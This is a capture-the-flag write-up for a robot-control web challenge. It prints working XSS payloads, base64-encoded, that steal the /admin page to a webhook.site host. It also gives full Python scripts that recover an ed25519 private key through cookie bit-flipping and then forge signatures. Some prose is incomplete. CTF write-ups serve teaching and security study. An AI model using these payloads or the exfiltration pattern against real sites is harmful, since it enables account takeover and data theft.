# Overview
---

>This is a cyberwar. <br>
>Every cyberwar has its robotank. <br>
>This is our robotank.

The challenge was a web-interface to control a robot located on site. Every team had their own unique credentials. At the first login every team received a coupon worth 5 credits. On the web-interface it was possible to buy an action at price of 5 credits (or a shield at the price of 15). 

The buttons in the main page could be used to execute real-time actions on the robot.
A single button could have the following state:
- **disabled**: the action was owned by another team, so you couldn't buy it.
- **blue**: no one owned the action, so it could be bought (supposed you had sufficient balance).
- **green**: you were the owner and you could execute it.

![](webinterface_start.png)
# Exploitation
---
## Web
We notice that in the account main page it is possible to change our team's motto.
In `bbrender.js` the team's motto is parsed and it is possible to use a custom tags to wr. The problem with this sintax is that is not only possible

```js
$(document).ready(() => {
	if (window.current_motto) {
		var current_motto = window.current_motto.innerText;
		
		//Welcome back to my laboratory, where safety is number one priority
		if (current_motto.includes("<") || current_motto.includes(">")) 
			return; 
		
		current_motto = current_motto.replace(/\[b\]/, "<strong>");
		current_motto = current_motto.replace(/\[\/b\]/, "</strong>");
		current_motto = current_motto.replace(/\[i\]/, "<i>");
		current_motto = current_motto.replace(/\[\/i\]/, "</i>");
		current_motto = current_motto.replace(/\[url ([^\]\ ]*)\]/, "<a href=$1>");
		current_motto = current_motto.replace(/(.*)\[\/url\]/, "$1</a>");
		
		// Images are so dangerous
		// current_motto = current_motto.replace(/\[img\]/, '<img src="');
		// current_motto = current_motto.replace(/\[\/img\]/, '" />');
		
		window.current_motto.innerHTML = current_motto;
	}
});
```


```js
fetch('/admin')
	.then(r=>r.text())
	.then((d)=>{
		fetch(
			'https://webhook.site/[webhook]',
			{method:'POST',body:d}
		)
	})
```

```
[url\"aa\"onfocus=\"eval(atob('ZmV0Y2goJy9hZG1pbicpLnRoZW4ocj0+ci50ZXh0KCkpLnRoZW4oKGQpPT57ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzcyZTEyMGZhLTQyOTEtNDY1ZC05ZDQ1LWI5Zjg0YzM2YmM5OD9jPScrZW5jb2RlVVJJQ29tcG9uZW50KGQpKX0p'))\"autofocus]ciao[/url]
```



```js
fetch(
	'/admin',
	{
		method: 'POST',
		headers: {"Content-Type":"application/json"},
		body: JSON.stringify({id: 1})
	}
)
```

```
[url\"aa\"onfocus=\"eval(atob('ZmV0Y2goJy9hZG1pbicse21ldGhvZDonUE9TVCcsaGVhZGVyczp7IkNvbnRlbnQtVHlwZSI6ImFwcGxpY2F0aW9uL2pzb24ifSxib2R5OkpTT04uc3RyaW5naWZ5KHtpZDogMX0pfSk='))\"autofocus]ciao[/url]
```




## Crypto

### Context
```js
if (await verifyToken(challenge, private_key, token)) {
	coupon = uuid();
	const result = await db.resetUser(user.id, coupon);
	...
```

The private key is generated using the following code:

TBA

### Recover the private key

Searching for all the occurrences of the private key in the source code one finds, at line 48 of `routes/auth.js` where `/auth/login` is treated, the following:

```js
if (user.curve_private_key && user.session_key) {
  // Generate public key and challenge
  encrypted_secret_key = xor(
    fromHex(user.curve_private_key),
    fromHex(user.session_key)
  );
  res.cookie("secret", toHex(encrypted_secret_key));
  user.challenge = genChallenge();
}
```

We know the value of this cookie, so if we can recover `session_key` we can **recover the private key** and sign the any given challenge.

To do so, we need to search where `session_key` is used in the code and if we can recover it from there. At line 43 of `routes/account.js` where `/account/:id` is treated we find:

```js
if (
  req.cookies.secret &&
  /^[0-9a-fA-F]+$/.test(req.cookies.secret) &&
  req.cookies.secret.length === 64
) {
  private_key = xor(fromHex(req.cookies.secret), fromHex(user.session_key));
} else {
  // Regenerate secret
  private_key = fromHex(user.curve_private_key);
  session_key = fromHex(user.session_key);
  encrypted_secret_key = xor(private_key, session_key);
  res.cookie("secret", toHex(encrypted_secret_key));
}
```

The `else` clause is the same as the one we saw before, so we can ignore it. The `if` clause is what we are looking for: **modifying the cookie** we can obtain a private key that is the xor of `session_key` and the chosen cookie; the private key is then used to compute the displayed public key.

Let us denote with $G$ the generator of `ed25519` and with $s$ the `session_key`. Recal that the public key is computed as $a \cdot G$ with $a \in \mathbb{Z}$. Let us denote with $s_i$ the $i^{th}$ bit of $s$, thus $s = \sum_{j = 0}^{255} s_j 2^j$. By modifying the cookie we can **flip any bit** of $s$ that we want.

Let $a, b$ be two arbitrary bits. We have that:

$$ a \oplus b =
\begin{cases}
  a & b = 0 \\
  1 - a & b = 1
\end{cases} $$

To recover $s$ we first recover $P = s \cdot G$ by sending a cookie with all 256 bits at zero. Then we flip only the $i^{th}$ bit of the zero cookie and we obtain $P_i = (s \oplus 2^i) \cdot G$. Given what we said before, we have that:

$$ P_i = (s \oplus 2^i) \cdot G = \sum_{j = 0, j \ne i}^{255} (s_j 2^j) \cdot G + ((s_i \oplus 1) 2^i) \cdot G $$

This means that:

$$ P - P_i = ((s_i - (s_i \oplus 1)) 2^i) \cdot G =
\begin{cases}
  -2^i \cdot G & s_i = 0 \\
  2^i \cdot G & s_i = 1
\end{cases} $$

and thus:

$$ s_i = \begin{cases}
  0 & P = P_i + 2^i \cdot G \\
  1 & P = P_i - 2^i \cdot G
\end{cases} $$

After 257 queries, one for $P$ and the others for all $P_i$, we should have all bits of $s$. To test this we can send $s$ as a cookie and check that the public key is $O = 0 \cdot G$. In truth, the server crashes, probably because the coordinates of $O$ are not explicitly defined.

Using the recovered `session_key` we can now **compute the private key** from the original cookie and sign any challenge the server sends us.

The following script called `ed25519_utils.py` contains the code to use the `ed25519` curve and some utility functions for the main exploit:

```python
from sage.all import GF, EllipticCurve

# Taken from https://neuromancer.sk/std/other/Ed25519

p = 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffed
K = GF(p)
a = K(0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffec)
d = K(0x52036cee2b6ffe738cc740797779e89800700a4d4141d8ab75eb4dca135978a3)
E = EllipticCurve(K, (K(-1) / K(48) * (a**2 + 14*a*d + d**2), K(1) / K(864) * (a + d) * (-a**2 + 34*a*d - d**2)))


def to_weierstrass(a, d, x, y):
    return ((5*a + a*y - 5*d*y - d)/(12 - 12*y), (a + a*y - d*y -d)/(4*x - 4*x*y))


def to_twistededwards(a, d, u, v):
    y = (5*a - 12*u - d)/(-12*u - a + 5*d)
    x = (a + a*y - d*y -d)/(4*v - 4*v*y)
    return (x, y)


G = E(*to_weierstrass(a, d, K(0x216936D3CD6E53FEC0A4E231FDD6DC5C692CC7609525A7B2C9562D608F25D51A), K(0x6666666666666666666666666666666666666666666666666666666666666658)))
E.set_order(0x1000000000000000000000000000000014def9dea2f79cd65812631a5cf5d3ed * 0x08)

# This curve is a Weierstrass curve (SAGE does not support TwistedEdwards curves) birationally equivalent to the intended curve.
# You can use the to_weierstrass and to_twistededwards functions to convert the points.


def get_secrets_to_send() -> "list[str]":
    secret = "0" * 64
    secrets = []
    for i in range(256):
        secrets.append(hex(int("0" * i + "1" + "0" * (256 - i - 1), 2))[2:].zfill(64))
    return [secret] + secrets


def recover_session_key(public_keys: "list[tuple[int, int]]") -> str:
    global G, E, a, d, K

    public_keys = [E(*to_weierstrass(a, d, K(x), K(y))) for x, y in public_keys]
    public_key, public_keys = public_keys[0], public_keys[1:]

    session_key = ""
    for i in range(256):
        if public_key + 2**(256 - i - 1) * G == public_keys[i]:
            session_key += "0"
        elif public_key - 2**(256 - i - 1) * G == public_keys[i]:
            session_key += "1"
        else:
            raise Exception("Unexpected relation between public keys")
    return hex(int(session_key, 2))[2:].zfill(64)


def recover_privkey(original_secret: str, session_key: str) -> str:
    original_secret = bytes.fromhex(original_secret)
    session_key = bytes.fromhex(session_key)
    privkey = bytes([a ^ b for a, b in zip(original_secret, session_key)])
    return privkey.hex()


def get_pubkey(privkey: str) -> "tuple[int, int]":
    global G, a, d
    return tuple(map(int, to_twistededwards(a, d, *(int(privkey, 16) * G).xy())))
```

The following script is the main exploit:

```python
from ed25519_utils import get_secrets_to_send, recover_session_key, recover_privkey, get_pubkey
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from Crypto.Util.number import long_to_bytes
import requests, ast, tqdm

url = "https://robotank.snakectf.org/"

session = requests.Session()

res = session.post(url + "auth/login", json={
    'password': '86c3baebe20b03ffb6568fd1f2d1e7d067d3c0925648a089ed11fc79e312463f',
    'username': 'srdnlen'
})

secret_original = session.cookies["secret"]

priv_key = "c78f3d1bc135ed0cf6c7d33a0e789332c4f5e9af9f6151cab6dd60e1cd85ef"

if priv_key is None:
    secrets = get_secrets_to_send()

    public_keys = []
    for secret in tqdm.tqdm(secrets):
        session.cookies.set("secret", secret)
        res = session.get(url + "account/13")
        assert "Public Key: " in res.text
        public_keys.append(ast.literal_eval(res.text.split("Public Key: ").pop().split("</p>").pop(0)))

    session_key = recover_session_key(public_keys)
    print("Session key:", session_key)

    # Check if session key is correct
    session.cookies.set("secret", session_key)
    res = session.get(url + "account/13")
    # Internal Server Error because it uses 0 as a private key
    assert res.status_code == 500

    priv_key = recover_privkey(secret_original, session_key)

    # Check if private key is correct
    session.cookies.set("secret", secret_original)
    res = session.get(url + "account/13")
    assert "Public Key: " in res.text
    public_key = ast.literal_eval(res.text.split("Public Key: ").pop().split("</p>").pop(0))
    public_key_recovered = get_pubkey(priv_key)
    assert public_key == public_key_recovered, "Public key mismatch, private key is incorrect"

    print("Private key:", priv_key)

sk = Ed25519PrivateKey.from_private_bytes(bytes.fromhex("00" + priv_key))


def sign(challenge: int) -> str:
    global sk
    sign = sk.sign(long_to_bytes(int(challenge)))
    return sign.hex()


try:
    while True:
        challenge = int(input("Challenge: "))
        print("Signature:", sign(challenge))
except KeyboardInterrupt:
    print("Bye!")
except Exception as e:
    print(e)
```
